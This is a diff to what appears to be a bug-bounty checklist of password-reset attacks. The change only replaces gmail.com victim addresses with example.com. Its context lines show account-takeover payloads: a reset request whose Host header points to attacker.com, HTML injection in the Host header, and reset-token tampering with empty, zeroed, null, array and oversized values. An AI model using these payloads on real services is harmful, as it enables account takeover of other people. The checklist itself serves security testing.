@@ -8,7 +8,7 @@ https://medium.com/bugbountywriteup/hubspot-full-account-takeover-in-bug-bounty-
 POST /reset
 ...
 ...
-email=victim@gmail.com&token=$YOUR-TOKEN$
+email=victim@example.com&token=$YOUR-TOKEN$
 
 ```
 
@@ -17,7 +17,7 @@ email=victim@gmail.com&token=$YOUR-TOKEN$
 POST /reset
 Host: attacker.com
 ...
-email=victim@gmail.com
+email=victim@example.com
 ```
 
 [ ] HTML injection in Host Header
@@ -25,7 +25,7 @@ email=victim@gmail.com
 POST /reset
 Host: attacker">.com
 ...
-email=victim@gmail.com
+email=victim@example.com
 ```
 
 [ ] Leakage of Password reset in Referer Header
@@ -59,22 +59,22 @@ HTML injection in email via parameters, cookie, etc > inject image > leak the  t
 
 [ ] Remove token
 ```
-http://example.com/reset?eamil=victims@gmail.com&token=
+http://example.com/reset?eamil=victims@example.com&token=
 ```
 
 [ ] Change it to 0000
 ```
-http://example.com/reset?eamil=victims@gmail.com&token=0000000000
+http://example.com/reset?eamil=victims@example.com&token=0000000000
 ```
 
 [ ] Use Null Value
 ```
-http://example.com/reset?eamil=victims@gmail.com&token=Null/nil
+http://example.com/reset?eamil=victims@example.com&token=Null/nil
 ```
 
 [ ] try an array of old tokens
 ```
-http://example.com/reset?eamil=victims@gmail.com&token=[oldtoken1,oldtoken2]
+http://example.com/reset?eamil=victims@example.com&token=[oldtoken1,oldtoken2]
 ```
 
 [ ] SQLi bypass
@@ -94,7 +94,7 @@ Replace bad response and replace with good one
 
 [ ] Massive Token
 ```
-http://example.com/reset?eamil=victims@gmail.com&token=1000000 long string
+http://example.com/reset?eamil=victims@example.com&token=1000000 long string
 ```
 
 [ ] Crossdomain Token Usage
